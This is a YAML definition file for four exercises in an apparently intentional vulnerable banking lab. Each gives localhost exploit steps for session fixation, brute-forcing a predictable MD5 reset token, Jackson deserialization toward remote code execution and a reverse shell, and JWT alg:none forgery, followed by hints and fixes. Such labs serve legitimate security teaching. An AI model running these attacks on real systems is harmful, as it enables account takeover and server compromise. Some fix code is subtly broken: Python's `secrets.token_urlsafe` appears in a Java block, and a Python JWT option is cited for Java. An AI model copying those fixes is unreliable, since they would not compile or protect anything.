  - id: 18
    category: A07
    categoryName: Authentication Failures
    title: "Session Fixation"
    severity: Medium
    objective: >-
      Pre-set a session id before login and hijack the session after authentication.
    exploit: |
      1. Obtain a session id before authenticating:

         ```bash
         curl -c cookies.txt -X POST http://localhost:8080/api/a07/session/init
         ```
      2. Log in using that same cookie. The application does **not** regenerate the
         session id on login — the session is now authenticated:

         ```bash
         curl -c cookies.txt -b cookies.txt -X POST http://localhost:8080/api/a07/auth/login-session \
           -H "Content-Type: application/json" \
           -d '{"username":"alice","password":"password123"}'
         ```
      3. Use the same cookie from another client:

         ```bash
         curl -b cookies.txt http://localhost:8080/api/a07/session/whoami
         ```
      4. The attacker now holds alice's authenticated session.
    hint: >-
      Compare the `JSESSIONID` value before and after the login request.
    fix: >-
      Regenerate the session id on successful authentication:

      ```java
      HttpSession session = request.getSession(false);
      if (session != null) {
          session.invalidate();
      }
      session = request.getSession(true);
      ```

      Spring's `request.changeSessionId()` is the equivalent.
    source: core/src/main/java/com/securebank/lab/a07/Lab18SessionController.java
    anchors:
      - "public ResponseEntity<?> loginSession("

  - id: 19
    category: A07
    categoryName: Authentication Failures
    title: "Insecure Password Reset: Predictable Token"
    severity: High
    objective: >-
      Compute a valid password reset token without access to the target's email.
    exploit: |
      1. Request a reset for alice and note the timestamp:

         ```bash
         TIME=$(date +%s)
         curl -X POST http://localhost:8080/api/a07/auth/reset-request \
           -H "Content-Type: application/json" \
           -d '{"username": "alice"}'
         ```
      2. Compute the token offline — the attacker knows the username and roughly
         when the request was made:

         ```python
         import hashlib, time
         username = "alice"
         for offset in range(-30, 31):
             ts = int(time.time()) + offset
             token = hashlib.md5(f"{username}{ts}".encode()).hexdigest()
             print(token)
         ```
      3. Submit the computed token:

         ```bash
         curl -X POST http://localhost:8080/api/a07/auth/reset-confirm \
           -H "Content-Type: application/json" \
           -d '{"token": "<computed_token>", "new_password": "hacked"}'
         ```
      4. Log in as alice with the new password.
    hint: >-
      The token is derived from two values an attacker already knows. How many
      candidates are there?
    fix: >-
      Use a cryptographically random token:

      ```java
      String token = secrets.token_urlsafe(32);
      ```

      Store it with a one-hour expiry, delete it after a single use, and do not
      return it in the response body.
    source: core/src/main/java/com/securebank/lab/a07/Lab19ResetController.java
    anchors:
      - "public ResponseEntity<?> resetRequest("

  - id: 20
    category: A08
    categoryName: Software & Data Integrity Failures
    title: "Insecure Deserialization: RCE"
    severity: High
    objective: >-
      Achieve remote code execution by uploading a malicious payload file.
    exploit: |
      1. Create the malicious payload — a JSON document whose type metadata names a
         gadget class:

         ```python
         import json
         # CommonsCollections / InvokerTransformer chain from commons-collections 3.2.1.
         # Jackson's As.PROPERTY default typing reads the type id from the "@class"
         # property, so that is the key the class name goes in.
         payload = {
             "@class": "org.apache.commons.collections.functors.InvokerTransformer",
             "functor": {"@class": "java.lang.Class", "className": "java.lang.Runtime"},
             "args": ["getRuntime"],
         }
         with open('payload.json', 'w') as f:
             json.dump(payload, f)
         ```
      2. Upload it to the account import endpoint:

         ```bash
         curl -X POST http://localhost:8080/api/a08/integrity/import-account \
           -H "Authorization: Bearer $TOKEN" \
           -F "data=@payload.json"
         ```
      3. The gadget chain executes on the server during deserialisation.
      4. Escalate to a reverse shell by changing the `args` to a shell command.
    hint: >-
      The import endpoint reads a file and deserialises it. What controls which class
      the deserialiser instantiates?
    fix: >-
      Never deserialize untrusted data into polymorphic types. Use JSON with a fixed
      schema, or validate against a schema with `jsonschema` before use. Never enable
      Jackson's `activateDefaultTyping` on an ObjectMapper that reads user input.
    source: core/src/main/java/com/securebank/lab/a08/Lab20DeserializationController.java
    anchors:
      - "public ResponseEntity<?> importAccount("

  - id: 21
    category: A08
    categoryName: Software & Data Integrity Failures
    title: "JWT Algorithm Confusion: alg:none Bypass"
    severity: Medium
    objective: >-
      Forge an admin JWT by stripping the signature and setting `alg: none`.
    exploit: |
      1. Get any valid JWT from login.
      2. Decode the header and payload (base64url).
      3. Forge an admin token with `alg: none`:

         ```python
         import base64, json

         def b64url(data):
             return base64.urlsafe_b64encode(
                 json.dumps(data).encode()).rstrip(b'=').decode()

         header = {"alg": "none", "typ": "JWT"}
         payload = {"user_id": 3, "username": "admin", "role": "admin"}
         forged = f"{b64url(header)}.{b64url(payload)}."
         print(forged)
         ```
      4. Use the forged token:

         ```bash
         curl -H "Authorization: Bearer <forged_token>" http://localhost:8080/api/a01/admin/users
         ```
    hint: >-
      The token's own header says which algorithm to use. Who controls that header?
    fix: >-
      Pin the algorithm explicitly and never honour the token's claim about itself:

      ```java
      Jwts.parser()
          .verifyWith(key)
          .build()
          .parseSignedClaims(token);
      ```

      Never pass `options={"verify_signature": false}`, and reject `alg: none`
      outright.
    source: core/src/main/java/com/securebank/core/security/JwtService.java
    anchors:
      - "if (\"none\".equalsIgnoreCase(String.valueOf(alg))) {"

